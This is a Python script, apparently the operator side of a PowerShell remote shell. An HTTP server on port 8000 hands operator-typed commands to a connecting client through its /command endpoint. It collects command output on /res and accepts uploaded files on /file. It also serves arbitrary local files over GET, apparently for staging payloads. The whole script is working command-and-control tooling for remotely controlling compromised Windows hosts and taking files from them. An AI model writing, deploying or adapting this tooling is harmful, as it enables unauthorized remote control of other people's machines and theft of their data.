from http.server import BaseHTTPRequestHandler, HTTPServer
import threading,json,base64
from urllib.parse import urlparse, parse_qs



class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.current_location = "C:\\"
        super().__init__(*args, **kwargs)

    def log_message(self, format: str, *args: threading) -> None:
        # print(format)
        pass
    
    def do_GET(self):
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        
        if self.path.startswith('/command'):
            self.current_location = base64.b64decode(query_params['q'][0]).decode('utf-8')
            command=input(f"PS {self.current_location} >")
            with open('Log.log', 'a') as w:
                w.write(command+'\n')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(bytes(command, 'utf-8'))
            return
        try:
            file_to_open = open(self.path[1:]).read()
            self.send_response(200)
        except:
            file_to_open = "File not found"
            self.send_response(404)
        self.end_headers()
        self.wfile.write(bytes(file_to_open, 'utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        path_part = self.path.split('/')
        self.path = path_part[1]
        if self.path == 'res':
            data= json.loads(post_data.decode())
            with open('Log.log', 'a') as w:
                w.write(data["data"])
            print(data["data"])

            response_message = f"Received POST request for /res endpoint with data"

        elif self.path == 'file':
            with open(path_part[2], 'wb') as w:
                w.write(post_data)

            response_message = f"Received POST request for /file endpoint with data"
        else:
            response_message = f"Received POST request with data"
            
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes(response_message, 'utf-8'))

def start_server():
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print("Server running on port 8000")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Shutting down server")
        httpd.server_close()

start_server()